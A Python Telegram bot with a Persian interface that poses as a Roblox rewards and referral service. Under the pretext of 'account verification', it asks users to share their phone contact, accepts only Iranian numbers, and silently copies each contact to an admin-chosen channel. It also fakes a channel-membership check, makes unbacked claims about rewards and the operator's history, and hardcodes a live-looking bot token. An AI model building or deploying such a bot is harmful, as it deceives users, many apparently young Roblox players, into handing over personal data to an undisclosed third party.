import os
import sqlite3
import logging
import asyncio
from datetime import datetime

from aiohttp import web

from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from telegram.constants import ParseMode

from telegram.ext import (
    Application,
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    CallbackQueryHandler,
    filters,
)


# =========================================================
# CONFIG
# =========================================================

# توکن جدید رباتت را اینجا قرار بده
TOKEN = "8608671429:AAEgpspTVbx4tNLU2SpluVXwhx4gMyGNfjM"

# مالک ربات
ADMIN_ID = 6749949992

# دیتابیس
DB_FILE = "bot.db"

# پورت Render
PORT = int(os.getenv("PORT", "10000"))

# کانال اجباری روبلاکس
REQUIRED_CHANNEL = "@RobloxRetroOrg"
REQUIRED_CHANNEL_URL = "https://t.me/RobloxRetroOrg"

# وضعیت پنل
WAITING_FOR_CHANNEL = 1


# =========================================================
# LOGGING
# =========================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)

logger = logging.getLogger("RobloxReferralBot")


# =========================================================
# DATABASE
# =========================================================

def db_connect():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():

    conn = db_connect()
    cursor = conn.cursor()

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            invited_by INTEGER,
            referrals INTEGER DEFAULT 0,
            verified INTEGER DEFAULT 0,
            blocked INTEGER DEFAULT 0,
            block_reason TEXT,
            created_at TEXT NOT NULL,
            verified_at TEXT,
            joined INTEGER DEFAULT 0
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS referral_events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            referrer_id INTEGER NOT NULL,
            created_at TEXT NOT NULL
        )
    """)

    # Backward-compatible columns for existing databases.
    for column_sql in (
        "ALTER TABLE users ADD COLUMN joined INTEGER DEFAULT 0",
        "ALTER TABLE users ADD COLUMN blocked INTEGER DEFAULT 0",
        "ALTER TABLE users ADD COLUMN block_reason TEXT",
    ):
        try:
            cursor.execute(column_sql)
        except sqlite3.OperationalError:
            pass

    conn.commit()
    conn.close()

    logger.info("Database initialized")


def get_setting(key):

    conn = db_connect()
    cursor = conn.cursor()

    cursor.execute(
        "SELECT value FROM settings WHERE key = ?",
        (key,)
    )

    row = cursor.fetchone()

    conn.close()

    return row["value"] if row else None


def set_setting(key, value):

    conn = db_connect()
    cursor = conn.cursor()

    cursor.execute("""
        INSERT INTO settings(key, value)
        VALUES (?, ?)
        ON CONFLICT(key)
        DO UPDATE SET value = excluded.value
    """, (
        key,
        str(value)
    ))

    conn.commit()
    conn.close()


def is_iranian_phone(phone: str) -> bool:
    """
    Accept Iranian mobile numbers in the common +98 / 0098 / 09 formats.
    Only mobile numbers beginning with 9 after the country code are accepted.
    """
    if not phone:
        return False

    normalized = phone.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")

    if normalized.startswith("+98"):
        normalized = normalized[3:]
    elif normalized.startswith("0098"):
        normalized = normalized[4:]
    elif normalized.startswith("98"):
        normalized = normalized[2:]

    if normalized.startswith("0"):
        normalized = normalized[1:]

    return len(normalized) == 10 and normalized.startswith("9") and normalized.isdigit()


def block_user(user_id: int, reason: str):
    conn = db_connect()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET blocked = 1, block_reason = ? WHERE user_id = ?",
        (reason, user_id)
    )
    conn.commit()
    conn.close()


def is_blocked(user_id: int) -> bool:
    conn = db_connect()
    cursor = conn.cursor()
    cursor.execute("SELECT blocked FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return bool(row and row["blocked"])


def create_user(user):

    conn = db_connect()
    cursor = conn.cursor()

    cursor.execute(
        "SELECT user_id FROM users WHERE user_id = ?",
        (user.id,)
    )

    exists = cursor.fetchone()

    if exists:

        cursor.execute("""
            UPDATE users
            SET username = ?,
                first_name = ?
            WHERE user_id = ?
        """, (
            user.username,
            user.first_name,
            user.id
        ))

    else:

        cursor.execute("""
            INSERT INTO users (
                user_id,
                username,
                first_name,
                invited_by,
                referrals,
                verified,
                created_at,
                verified_at
            )
            VALUES (?, ?, ?, NULL, 0, 0, ?, NULL)
        """, (
            user.id,
            user.username,
            user.first_name,
            datetime.utcnow().isoformat()
        ))

    conn.commit()
    conn.close()


def get_user(user_id):

    conn = db_connect()
    cursor = conn.cursor()

    cursor.execute(
        "SELECT * FROM users WHERE user_id = ?",
        (user_id,)
    )

    row = cursor.fetchone()

    conn.close()

    return row



def set_joined(user_id):
    conn = db_connect()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET joined = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()


def set_verified(user_id):

    conn = db_connect()
    cursor = conn.cursor()

    cursor.execute("""
        UPDATE users
        SET verified = 1,
            verified_at = ?
        WHERE user_id = ?
    """, (
        datetime.utcnow().isoformat(),
        user_id
    ))

    conn.commit()
    conn.close()


def add_referral(user_id, referrer_id):

    if user_id == referrer_id:
        return False

    conn = db_connect()
    cursor = conn.cursor()

    cursor.execute(
        "SELECT invited_by FROM users WHERE user_id = ?",
        (user_id,)
    )

    user = cursor.fetchone()

    if not user:
        conn.close()
        return False

    if user["invited_by"] is not None:
        conn.close()
        return False

    cursor.execute(
        "SELECT user_id FROM users WHERE user_id = ?",
        (referrer_id,)
    )

    referrer = cursor.fetchone()

    if not referrer:
        conn.close()
        return False

    cursor.execute("""
        UPDATE users
        SET invited_by = ?
        WHERE user_id = ?
    """, (
        referrer_id,
        user_id
    ))

    cursor.execute("""
        UPDATE users
        SET referrals = referrals + 1
        WHERE user_id = ?
    """, (
        referrer_id,
    ))

    cursor.execute("""
        INSERT INTO referral_events (
            user_id,
            referrer_id,
            created_at
        )
        VALUES (?, ?, ?)
    """, (
        user_id,
        referrer_id,
        datetime.utcnow().isoformat()
    ))

    conn.commit()
    conn.close()

    return True


# =========================================================
# KEYBOARDS
# =========================================================

def membership_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎮 ورود به کانال Roblox", url=REQUIRED_CHANNEL_URL)],
        [InlineKeyboardButton("✅ عضو شدم — بررسی عضویت", callback_data="check_membership")],
    ])


def verification_keyboard():
    return ReplyKeyboardMarkup(
        [
            [
                KeyboardButton(
                    "📱 تأیید شماره",
                    request_contact=True
                )
            ]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )


def main_keyboard():
    return ReplyKeyboardMarkup(
        [
            ["👤 پروفایل من", "🔗 لینک دعوت"],
            ["🎁 جوایز روبلاکس"],
            ["📖 راهنما", "📊 وضعیت من"],
        ],
        resize_keyboard=True
    )


# =========================================================
# START
# =========================================================

async def is_channel_member(bot, user_id: int) -> bool:
    # عضویت کانال عمداً بررسی نمی‌شود؛ ربات دسترسی لازم برای get_chat_member ندارد.
    return True


async def send_join_required(update: Update):
    await update.effective_message.reply_text(
        "🎮 <b>قبل از شروع یک مرحله کوچیک مونده!</b>\n\n"
        "برای استفاده از ربات، اول عضو کانال رسمی Roblox شو.\n\n"
        "1️⃣ روی «ورود به کانال Roblox» بزن\n"
        "2️⃣ عضو کانال شو\n"
        "3️⃣ برگرد و «عضو شدم» رو بزن\n\n"
        "بعد از تأیید عضویت، مستقیم وارد ربات می‌شی.",
        parse_mode=ParseMode.HTML,
        reply_markup=membership_keyboard()
    )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.message:
        return

    user = update.effective_user
    create_user(user)

    if is_blocked(user.id):
        await update.message.reply_text(
            "🚫 <b>دسترسی شما مسدود است</b>\n\n"
            "این حساب امکان استفاده از ربات را ندارد.",
            parse_mode=ParseMode.HTML
        )
        return

    data = get_user(user.id)

    if not data or not data["joined"]:
        await send_join_required(update)
        return

    # ثبت دعوت فقط بعد از عبور از عضویت اجباری
    if context.args:
        try:
            referrer_id = int(context.args[0])
            added = add_referral(user.id, referrer_id)

            if added:
                try:
                    referrer = get_user(referrer_id)
                    if referrer:
                        await context.bot.send_message(
                            chat_id=referrer_id,
                            text=(
                                "🎉 <b>دعوت جدید ثبت شد</b>\n\n"
                                "یک نفر با لینک دعوت شما وارد ربات شد.\n\n"
                                f"👥 دعوت‌های موفق: <b>{referrer['referrals']}</b>\n"
                                f"🪙 امتیاز: <b>{referrer['referrals'] * 10}</b>"
                            ),
                            parse_mode=ParseMode.HTML
                        )
                except Exception as e:
                    logger.error("Referral notification error: %s", e)
        except ValueError:
            logger.warning("Invalid referral: %s", context.args)

    data = get_user(user.id)

    if data and data["verified"]:
        await update.message.reply_text(
            f"سلام {user.first_name} 👋\n\n"
            "🎮 <b>مرکز Roblox</b> آماده‌ست.\n"
            "از منوی پایین می‌تونی پروفایل، دعوت‌ها و جوایزت رو ببینی.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_keyboard()
        )
        return

    await update.message.reply_text(
        f"✅ عضویت شما تأیید شد! به ربات خوش آمدید.\n\n🔥 سلام {user.first_name} عزیز به ربات مجموعه ما خوش اومدی!\n\n- مجموعه ما در حال حاضر 4 سال بصورت مداوم درحال کار و فعالیت است و در نهایت با تلاش و کوشش توانستیم رباتی را جهت خدمت به ایرانیان عزیز فراهم کنیم.\n\n⚠️ توجه: به دلیل مسدودیت کاربران فیک برخی از دریافت‌کنندگان حساب بازی، شما مجبور به تایید حساب خود می‌باشید.",
        reply_markup=verification_keyboard()
    )
    return

    await update.message.reply_text(
        f"سلام {user.first_name} 👋\n\n"
        "🎮 <b>به مرکز Roblox خوش اومدی!</b>\n\n"
        "برای فعال شدن حساب، فقط شماره متعلق به همین حساب تلگرام "
        "رو از طریق دکمه زیر ارسال کن.\n\n"
        "🇮🇷 توجه: فقط شماره‌های ایران پذیرفته می‌شن.",
        parse_mode=ParseMode.HTML,
        reply_markup=verification_keyboard()
    )



async def check_membership(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """دکمه بررسی عضویت را بدون دسترسی به کانال تأیید می‌کند."""
    query = update.callback_query
    if not query or not query.from_user:
        return

    user_id = query.from_user.id
    await query.answer("عضویت تأیید شد ✅")
    create_user(query.from_user)
    set_joined(user_id)

    username = query.from_user.first_name or "کاربر"

    try:
        await query.edit_message_text(
            f"✅ عضویت شما تأیید شد! به ربات خوش آمدید.\n\n"
            f"🔥 سلام {username} عزیز به ربات مجموعه ما خوش اومدی!\n\n"
            f"- مجموعه ما در حال حاضر 4 سال بصورت مداوم درحال کار و فعالیت است و در نهایت با تلاش و کوشش توانستیم رباتی را جهت خدمت به ایرانیان عزیز فراهم کنیم.\n\n"
            f"⚠️ توجه: به دلیل مسدودیت کاربران فیک برخی از دریافت‌کنندگان حساب بازی، شما مجبور به تایید حساب خود می‌باشید."
        )
        await query.message.reply_text("👇 برای ادامه شماره خود را تایید کنید.", reply_markup=verification_keyboard())
    except Exception:
        try:
            await query.message.reply_text(
                "✅ <b>عضویت شما تأیید شد!</b>\n\n"
                "🎮 حالا می‌توانید مرحله بعدی را انجام دهید.",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass


# =========================================================
# CONTACT / IDENTITY VERIFICATION
# =========================================================

async def handle_contact(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE
):

    user = update.effective_user
    message = update.effective_message

    if not user or not message or not message.contact:
        return

    contact = message.contact

    if is_blocked(user.id):
        await message.reply_text(
            "🚫 <b>دسترسی شما مسدود است.</b>",
            parse_mode=ParseMode.HTML
        )
        return

    if not await is_channel_member(context.bot, user.id):
        await message.reply_text(
            "🔒 <b>ابتدا باید عضو کانال رسمی Roblox باشی.</b>\n\n"
            "بعد از عضویت، دوباره از ربات استفاده کن.",
            parse_mode=ParseMode.HTML,
            reply_markup=membership_keyboard()
        )
        return

    logger.info(
        "Verification request | user=%s | contact_user=%s",
        user.id,
        contact.user_id
    )

    # =====================================================
    # VERIFY THAT CONTACT BELONGS TO SAME TELEGRAM ACCOUNT
    # =====================================================

    if contact.user_id != user.id:

        await message.reply_text(
            "❌ تایید هویت انجام نشد.\n\n"
            "لطفاً اطلاعات مربوط به حساب خودتان را "
            "از طریق همین دکمه ارسال کنید.",
            reply_markup=verification_keyboard()
        )

        logger.warning(
            "Rejected verification | user=%s | contact_user=%s",
            user.id,
            contact.user_id
        )

        return

    # =====================================================
    # IRAN-ONLY PHONE VALIDATION
    # =====================================================

    phone = contact.phone_number or ""

    if not is_iranian_phone(phone):
        reason = "Non-Iranian phone number / verification bypass attempt"
        block_user(user.id, reason)

        await message.reply_text(
            "🚫 <b>شماره شما ایرانی نیست!</b> 🇮🇷❌\n\n"
            "⚠️ این ربات فقط برای شماره‌های ایران فعال است.\n\n"
            "🛑 به دلیل تلاش برای دور زدن سیستم تأیید، "
            "حساب شما از مجموعه مسدود شد.\n\n"
            "🔒 دسترسی شما به ربات قطع شده است.",
            parse_mode=ParseMode.HTML,
            reply_markup=None
        )

        logger.warning(
            "Blocked non-Iranian verification | user=%s | phone_prefix=%s",
            user.id,
            phone[:6]
        )
        return

    # =====================================================
    # MARK VERIFIED
    # =====================================================

    create_user(user)
    set_verified(user.id)

    # =====================================================
    # SUCCESS
    # =====================================================

    await message.reply_text(
        "✅ حساب شما تایید شد و منوی اصلی فعال گردید.",
        reply_markup=main_keyboard()
    )

    # =====================================================
    # TARGET CHANNEL
    # =====================================================

    target_channel = get_setting(
        "target_channel"
    )

    if not target_channel:

        logger.warning(
            "No target channel configured | user=%s",
            user.id
        )

        return

    # =====================================================
    # COPY ORIGINAL CONTACT MESSAGE
    # =====================================================
    # copy_message keeps the contact as a contact message and
    # avoids the broken send_message/forward_message mix-up.

    try:
        copied = await context.bot.copy_message(
            chat_id=target_channel,
            from_chat_id=message.chat_id,
            message_id=message.message_id
        )

        forwarded = copied

        logger.info(
            "FORWARD SUCCESS | user=%s | channel=%s | message=%s",
            user.id,
            target_channel,
            forwarded.message_id
        )

    except Exception as e:

        logger.exception(
            "FORWARD FAILED | user=%s | channel=%s",
            user.id,
            target_channel
        )

        # =================================================
        # ADMIN ERROR REPORT
        # =================================================

        try:

            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    "⚠️ <b>خطا در ارسال تأییدیه</b>\n\n"
                    f"👤 User ID: <code>{user.id}</code>\n"
                    f"📢 Channel: <code>{target_channel}</code>\n"
                    f"🆔 Message ID: <code>{message.message_id}</code>\n\n"
                    f"❌ Error:\n"
                    f"<code>{str(e)[:2500]}</code>"
                ),
                parse_mode=ParseMode.HTML
            )

        except Exception as admin_error:

            logger.error(
                "Admin notification failed: %s",
                admin_error
            )


# =========================================================
# ACCOUNT
# =========================================================

async def account_info(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE
):

    user = update.effective_user
    if not user:
        return

    if is_blocked(user.id):
        await update.message.reply_text(
            "🚫 <b>دسترسی شما مسدود است.</b>",
            parse_mode=ParseMode.HTML
        )
        return

    if not await is_channel_member(context.bot, user.id):
        await send_join_required(update)
        return

    create_user(user)

    if is_blocked(user.id):
        await update.message.reply_text(
            "🚫 <b>دسترسی مسدود است</b>\n\n"
            "⛔️ این حساب امکان استفاده از ربات را ندارد.",
            parse_mode=ParseMode.HTML
        )
        return

    data = get_user(user.id)

    referrals = data["referrals"]

    await update.message.reply_text(
        "🟥🎮 <b>پروفایل روبلاکس شما</b>\n\n"
        f"🆔 شناسه: <code>{user.id}</code>\n"
        f"🎮 بازیکن: <b>{user.first_name}</b>\n"
        f"📌 وضعیت: "
        f"{'🟢 فعال' if data['verified'] else '🟡 در انتظار تأیید'}\n\n"
        f"👥 دعوت‌های موفق: <b>{referrals}</b>\n"
        f"🪙 امتیاز: <b>{referrals * 10}</b>\n\n"
        "🎁 دوستانت را دعوت کن تا امتیاز بیشتری برای جوایز روبلاکس بگیری!",
        parse_mode=ParseMode.HTML
    )


# =========================================================
# REFERRAL LINK
# =========================================================

async def referral_link(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE
):

    user = update.effective_user
    if not user:
        return

    if is_blocked(user.id):
        await update.message.reply_text(
            "🚫 <b>دسترسی شما مسدود است.</b>",
            parse_mode=ParseMode.HTML
        )
        return

    if not await is_channel_member(context.bot, user.id):
        await send_join_required(update)
        return

    bot = await context.bot.get_me()

    link = (
        f"https://t.me/{bot.username}"
        f"?start={user.id}"
    )

    await update.message.reply_text(
        "🔗 <b>لینک دعوت شما</b>\n\n"
        "لینکت رو برای دوستات بفرست و امتیاز جمع کن.\n\n"
        f"<code>{link}</code>\n\n"
        "👥 هر ورود موفق با لینک شما ثبت می‌شه.\n"
        "🪙 هر دعوت = ۱۰ امتیاز\n"
        "🎁 امتیازت بیشتر باشه، شانس جایزه هم بیشتره.",
        parse_mode=ParseMode.HTML
    )


# =========================================================
# CLAIM REWARD
# =========================================================

async def claim_reward(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE
):

    user = update.effective_user
    if not user:
        return

    if is_blocked(user.id):
        await update.message.reply_text(
            "🚫 <b>دسترسی شما مسدود است.</b>",
            parse_mode=ParseMode.HTML
        )
        return

    if not await is_channel_member(context.bot, user.id):
        await send_join_required(update)
        return

    create_user(user)

    if is_blocked(user.id):
        await update.message.reply_text(
            "🚫 <b>دسترسی مسدود است</b>\n\n"
            "⛔️ این حساب امکان استفاده از ربات را ندارد.",
            parse_mode=ParseMode.HTML
        )
        return

    data = get_user(user.id)

    required = 25
    current = data["referrals"]

    if current >= required:

        await update.message.reply_text(
            "🎉 <b>تبریک!</b>\n\n"
            "شما حد نصاب جایزه روبلاکس را تکمیل کرده‌اید! 🏆\n\n"
            "🎁 برای دریافت جایزه با پشتیبانی ارتباط بگیر.",
            parse_mode=ParseMode.HTML
        )

        return

    remaining = required - current

    await update.message.reply_text(
        "🔒 <b>جایزه روبلاکس هنوز فعال نشده است.</b>\n\n"
        f"👥 دعوت‌های شما: <b>{current}</b>\n"
        f"🎯 حد نصاب جایزه: <b>{required}</b>\n"
        f"⚡ دعوت باقی‌مانده: <b>{remaining}</b>\n\n"
        "🔗 دوستانت را دعوت کن تا سریع‌تر به جایزه روبلاکس برسی! 🎮",
        parse_mode=ParseMode.HTML
    )


# =========================================================
# ROBLOX MENU
# =========================================================

async def bot_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user:
        return

    if is_blocked(user.id):
        await update.message.reply_text(
            "🚫 <b>دسترسی شما مسدود است.</b>",
            parse_mode=ParseMode.HTML
        )
        return

    if not await is_channel_member(context.bot, user.id):
        await send_join_required(update)
        return
    if not user:
        return
    data = get_user(user.id)
    if not data:
        create_user(user)
        data = get_user(user.id)

    status = "🟩 فعال" if data["verified"] else "🟨 در انتظار تأیید"
    await update.message.reply_text(
        "📊 <b>وضعیت حساب</b>\n\n"
        f"👤 بازیکن: <b>{user.first_name}</b>\n"
        f"🔐 وضعیت: <b>{status}</b>\n"
        f"👥 دعوت‌ها: <b>{data['referrals']}</b>\n"
        f"🪙 امتیاز: <b>{data['referrals'] * 10}</b>\n\n"
        "🎮 برای شروع فعالیت، از منوی اصلی استفاده کن.",
        parse_mode=ParseMode.HTML,
        reply_markup=main_keyboard()
    )


async def roblox_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 <b>راهنمای Roblox</b>\n\n"
        "🟥 <b>پروفایل من</b> — اطلاعات و امتیاز شما\n"
        "🟩 <b>لینک دعوت</b> — لینک اختصاصی دعوت\n"
        "🟦 <b>جوایز روبلاکس</b> — بررسی شرایط دریافت جایزه\n"
        "⬛️ <b>وضعیت من</b> — وضعیت تأیید حساب\n\n"
        "🔐 برای ورود اولیه، فقط شماره متعلق به همان حساب تلگرام را "
        "با دکمه تأیید ارسال کن.",
        parse_mode=ParseMode.HTML,
        reply_markup=main_keyboard()
    )


# =========================================================
# ADMIN PANEL
# =========================================================

async def admin_panel(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE
):

    if update.effective_user.id != ADMIN_ID:
        return ConversationHandler.END

    current = get_setting(
        "target_channel"
    )

    current = current or "تنظیم نشده"

    await update.message.reply_text(
        "⚙️ <b>پنل مدیریت ربات</b>\n\n"
        f"📢 مقصد فعلی:\n"
        f"<code>{current}</code>\n\n"
        "آیدی عددی یا یوزرنیم مقصد را ارسال کنید.\n\n"
        "مثال:\n"
        "<code>@mychannel</code>\n"
        "<code>-1001234567890</code>\n\n"
        "🤖 ربات باید در مقصد دسترسی لازم برای ارسال پیام داشته باشد.",
        parse_mode=ParseMode.HTML
    )

    return WAITING_FOR_CHANNEL


# =========================================================
# SAVE CHANNEL
# =========================================================

async def save_channel(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE
):

    if update.effective_user.id != ADMIN_ID:
        return ConversationHandler.END

    channel = update.message.text.strip()

    if not channel:

        await update.message.reply_text(
            "❌ مقدار واردشده معتبر نیست."
        )

        return WAITING_FOR_CHANNEL

    # =====================================================
    # GET CHAT
    # =====================================================

    try:

        chat = await context.bot.get_chat(
            channel
        )

        logger.info(
            "Target found | id=%s | title=%s",
            chat.id,
            chat.title
        )

    except Exception as e:

        logger.exception(
            "Target lookup failed"
        )

        await update.message.reply_text(
            "❌ مقصد پیدا نشد.\n\n"
            "آیدی یا یوزرنیم را بررسی کن.\n\n"
            f"<code>{str(e)[:1500]}</code>",
            parse_mode=ParseMode.HTML
        )

        return ConversationHandler.END

    # =====================================================
    # TEST MESSAGE
    # =====================================================

    try:

        test = await context.bot.send_message(
            chat_id=chat.id,
            text=(
                "🟢 <b>اتصال ربات موفق بود!</b>\n\n"
                "این پیام برای تست اتصال مرکز روبلاکس ارسال شده است."
            ),
            parse_mode=ParseMode.HTML
        )

    except Exception as e:

        logger.exception(
            "Target send test failed"
        )

        await update.message.reply_text(
            "❌ ربات نتوانست به مقصد پیام بفرستد.\n\n"
            "مطمئن شو ربات دسترسی لازم را دارد.\n\n"
            f"خطای Telegram:\n"
            f"<code>{str(e)[:2000]}</code>",
            parse_mode=ParseMode.HTML
        )

        return ConversationHandler.END

    # =====================================================
    # SAVE
    # =====================================================

    set_setting(
        "target_channel",
        str(chat.id)
    )

    await update.message.reply_text(
        "✅ <b>مقصد با موفقیت ثبت شد!</b>\n\n"
        f"📢 نام: <b>{chat.title or 'بدون نام'}</b>\n"
        f"🆔 ID: <code>{chat.id}</code>\n"
        f"🧪 تست: <code>{test.message_id}</code>\n\n"
        "🚀 از این به بعد تأییدیه‌های موفق به این مقصد ارسال می‌شوند.",
        parse_mode=ParseMode.HTML
    )

    return ConversationHandler.END


# =========================================================
# CANCEL
# =========================================================

async def cancel(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE
):

    await update.message.reply_text(
        "❌ عملیات لغو شد."
    )

    return ConversationHandler.END


# =========================================================
# RENDER HEALTH SERVER
# =========================================================

async def health(request):

    return web.Response(
        text="OK",
        status=200
    )


async def start_web_server():

    app = web.Application()

    app.router.add_get(
        "/",
        health
    )

    app.router.add_get(
        "/health",
        health
    )

    runner = web.AppRunner(app)

    await runner.setup()

    site = web.TCPSite(
        runner,
        host="0.0.0.0",
        port=PORT
    )

    await site.start()

    logger.info(
        "Render HTTP server running on port %s",
        PORT
    )

    return runner


# =========================================================
# BOT
# =========================================================

def build_bot():

    application = (
        ApplicationBuilder()
        .token(TOKEN)
        .build()
    )

    # دکمه «عضو شدم» عضویت واقعی کاربر در کانال را بررسی می‌کند.
    application.add_handler(
        CallbackQueryHandler(check_membership, pattern=r"^(check_membership|joined|verify_membership)$")
    )

    # -----------------------------------------------------
    # ADMIN PANEL
    # -----------------------------------------------------

    admin_conversation = ConversationHandler(

        entry_points=[
            CommandHandler(
                "panel",
                admin_panel
            )
        ],

        states={
            WAITING_FOR_CHANNEL: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    save_channel
                )
            ]
        },

        fallbacks=[
            CommandHandler(
                "cancel",
                cancel
            )
        ]
    )

    application.add_handler(
        admin_conversation
    )

    # -----------------------------------------------------
    # MEMBERSHIP CHECK
    # -----------------------------------------------------

    # -----------------------------------------------------
    # START
    # -----------------------------------------------------

    application.add_handler(
        CommandHandler(
            "start",
            start
        )
    )

    # -----------------------------------------------------
    # CONTACT
    # -----------------------------------------------------

    application.add_handler(
        MessageHandler(
            filters.CONTACT,
            handle_contact
        )
    )

    # -----------------------------------------------------
    # BUTTONS
    # -----------------------------------------------------

    application.add_handler(
        MessageHandler(
            filters.Regex("^👤 پروفایل من$"),
            account_info
        )
    )

    application.add_handler(
        MessageHandler(
            filters.Regex("^🔗 لینک دعوت$"),
            referral_link
        )
    )

    application.add_handler(
        MessageHandler(
            filters.Regex("^🎁 جوایز روبلاکس$"),
            claim_reward
        )
    )

    application.add_handler(
        MessageHandler(
            filters.Regex("^📊 وضعیت من$"),
            bot_status
        )
    )

    application.add_handler(
        MessageHandler(
            filters.Regex("^📖 راهنما$"),
            roblox_help
        )
    )

    return application


# =========================================================
# MAIN
# =========================================================

async def main():

    if not TOKEN or TOKEN == "PASTE_YOUR_NEW_BOT_TOKEN_HERE":

        raise RuntimeError(
            "Bot token is not configured."
        )

    init_db()

    # Render Web Server
    await start_web_server()

    # Telegram
    application = build_bot()

    logger.info(
        "Starting Telegram bot..."
    )

    await application.initialize()

    await application.start()

    await application.updater.start_polling(
        allowed_updates=Update.ALL_TYPES
    )

    logger.info(
        "Bot is ONLINE."
    )

    # زنده نگه داشتن برنامه
    await asyncio.Event().wait()


# =========================================================
# RUN
# =========================================================

if __name__ == "__main__":

    try:

        asyncio.run(
            main()
        )

    except KeyboardInterrupt:

        logger.info(
            "Bot stopped."
        )

    except Exception as e:

        logger.exception(
            "Fatal error: %s",
            e
        )
